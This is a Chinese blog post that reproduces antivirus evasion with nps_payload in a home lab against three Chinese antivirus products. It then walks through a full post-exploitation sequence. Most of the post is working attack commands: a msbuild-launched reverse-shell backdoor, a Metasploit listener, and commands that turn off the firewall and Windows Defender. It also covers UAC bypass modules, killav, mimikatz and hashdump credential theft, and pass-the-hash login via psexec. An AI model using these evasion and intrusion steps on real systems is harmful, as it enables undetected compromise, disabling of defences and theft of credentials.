---
title: "nps_payload免杀三件套及常用渗透流程"
categories: [ "安全技术","工具分享" ]
tags: [ "MSF","免杀","渗透测试" ]
draft: false
slug: "464"
date: "2020-01-31 10:03:00"
---

## 事情起因

跟着 Tidesec 团队的免杀系列做复现，只做 360，火绒，腾讯电脑管家都能过的免杀工具

终于在免杀专题 19 成功，还是热乎的没有被这几大厂商封掉

于是复现并走一遍常见渗透测试流程

参考文章：

- [远控免杀专题(19)-nps_payload 免杀(VT 免杀率 3/57)][1]

## 环境搭建

我这里为了能够顺便模拟提权过程，特地新建了一个标准管理员用户

**注意：此处练手提权不要创建普通用户**，创建普通用户获得`meterpreter`会话后，我尝试了

- ps 里根本没有除了普通用户的进程，无法 migrate
- bypass uac 的 exploit 不行
- load mimikatz 和 hashdump 提示没权限
- windows-exploit-suggester 和后渗透模块 post/multi/recon/local_exploit_suggester 全部失败

所以，在经历过普通用户提权的折磨后，我放弃了，把`user`用户加入了管理员组

配置如下：

- Win7 SP1 build 7601
- windows 防火墙打开
- 360 杀毒正式版 5.0.0.8170
- 腾讯电脑管家 13.3.20238.213
- 火绒 5.0.36.16
- Administrator:password 和 user:123456

来一张全家福：

![][2]

360 显示需要关闭其他杀毒软件才能完全开启权限，但我操作了也不能打开，就这样吧

## nps_payload

### nps_payload 介绍

> nps_payload 是 2017 年开源的工具，安装使用都比较简单,nps_payload 可以生成基于 msbuild 的 xml 文件和独立执行的 hta 文件，并对 xml 文件和 hta 文件做了一定的混淆免杀，从而达到免杀的效果。

### 安装 nps_payload

1. 克隆到本地

```
git clone  https://github.com/trustedsec/nps_payload
```

2. 安装 py 依赖

```
cd nps_payload
pip install -r requirements.txt
```

3. 运行

```
python nps_payload.py
```

### nps_payload 使用说明

`nps_payload`生成的`xml`或`hta`文件都需要使用 msbuild 来执行

> `Microsoft Build Engine`是一个用于构建应用程序的平台，此引擎也被称为`msbuild`，它为项目文件提供一个`XML`模式，该模式控制构建平台如何处理和构建软件。`Visual Studio`使用`MSBuild`，但它不依赖于`Visual Studio`。通过在项目或解决方案文件中调用`msbuild.exe`，可以在未安装`Visual Studio`的环境中编译和生成程序。

说明：`Msbuild.exe`所在路径没有被系统添加`PATH`环境变量中，因此，Msbuild 命令无法直接在 cmd 中使用。需要带上路径：`C:\Windows\Microsoft.NET\Framework\v4.0.30319`

也就是这个免杀只能在`NET Framework>=4.0`的环境下使用

你可以打开`C:\Windows\Microsoft.NET\Framework\`这个路径看一眼是否支持

![][3]

### 使用 nps_payload 生成后门

只有两种生成方式，我这里就使用第一种，填入自己`kali`的`ip`和`port`

等待一会就生成了，说句题外话，一般不要把端口设置为`4444`，

因为几乎所有的`msf`的提权模块都默认使用`4444`端口而且无法修改

![][4]

生成后在当前目录就得到我们需要的木马文件`msbuild_nps.xml`

![][5]

文件执行的方式有两种

1. 本地加载执行:

```
%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
```

2. 远程文件执行:

```
wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
```

我这里就用本地加载进行测试，先在`kali`上开启监听：

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.2
set LPORT 3333
set ExitOnSession false
exploit -j -z
```

![][6]

这里又有两个使用`msf`的小技巧:

- set ExitOnSession false 可以在接收到 seesion 后继续监听端口，保持侦听，也就是防止假 session
- exploit -j -z 可在后台持续监听,-j 为后台任务，-z 为持续监听，这样反弹一个 shell 就能接收一个

在目标机上执行本地加载免杀文件，在 msbuild_nps.xml 当前目录打开`cmd`，执行：

```
%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe msbuild_nps.xml
```

**这里的`cmd`需要以管理员权限执行，要不然进程里只有`user`用户的无法提权**

![][7]

可以看到，三件套杀毒软件都没有反应，成功免杀

由于`exploit`使用了`-j`选项，因此靶机上执行时可能过几秒`kali`上才会有反应

另外，如果`msf`显示了连接到`session`但是假死了，按下回车，再`sessions`打开查看就行了

然后我们`sessions -i 1`打开`session`走一遍渗透测试流程

## 常见渗透测试流程

### 安全措施

切换到`shell`关闭`windows defender`

```
shell
chcp 65001
关闭防火墙
netsh advfirewall set allprofiles state off
关闭windows defender
net stop windefend
```

![][8]

![][9]

![][10]

### 提权及密码获取

首先看下权限：`getuid`并习惯性的用`meterpreter`自带提权命令`getsystem`提权

> 如果不是`meterpreter`而是`shell`才使用`whoami`

![][11]

可以看到默认提权失败，进程里是有管理员和`system`进程的，怀疑有`uac`

其实获得会话后`bypass uac`才应该是第一步

`ctrl+z`输入`y`将会话退到后台(`shell`退到`meterpreter`也是这样)

```
use exploit/windows/local/bypassuac
set session 1
exploit
getsystem
getuid
```

![][12]

可以看到我们`bypass`也失败了，上传的提权文件被腾讯管家拦截了

`bypass uac`还可以用另一个模块：

```
use exploit/windows/local/ask
set session 1
exploit
```

正常情况下只要用户点击弹窗的确认就能绕过`uac`，但是上传的文件又被`360`拦截了

那就最简单的办法，`migrate PID`迁移进程

首先`ps`查看下进程，选择一个`system`进程，并记住`PID`：

![][13]

然后`migrate 1192`并`查看权限`：

![][14]

成功获取到`system`权限，杀毒软件很碍事，杀掉吧：`run killav`

不过好像没啥用，只关掉了我们运行`msbuild_nps.xml`的`cmd`窗口

那我们获取下密码：

```
load mimikatz
kerberos
```

![][15]

这是明文密码，一般实战中不容易获取，实战中更容易获取到的是`hash值`

```
hashdump
```

![][16]

获取到`hash`值后我们可以直接使用`hash`值登录目标主机

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.2
set RHOST 192.168.1.11
set LPORT 2222
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set SMBUser administrator
exploit
```

![][17]

这里实测调用`powershell`会被 360 查杀

通过以上的例子，可以看出在实际的渗透测试中，即使获得了会话

各种杀毒软件也会乐此不疲地查杀各种利用模块

因此，我们必须学会在夹缝中生存。

参考文章：

- [Meterpreter 提权那些事][18]

[1]: https://mp.weixin.qq.com/s/XmSRgRUftMV3nmD1Gk0mvA
[2]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200131_172905.png
[3]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200130_215735.png
[4]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200131_121253.png
[5]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200131_102226.png
[6]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200131_121253.png
[7]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200131_181113.png
[8]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_142213.png
[9]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_142234.png
[10]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_142256.png
[11]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_133916.png
[12]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_134322.png
[13]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_134801.png
[14]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_134839.png
[15]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_135341.png
[16]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_164139.png
[17]: https://img.soapffz.com/archives_img/2020/01/31/archives_20200201_164524.png
[18]: https://mp.weixin.qq.com/s/QXOmGCL8f2ISWAlYQ0mqPA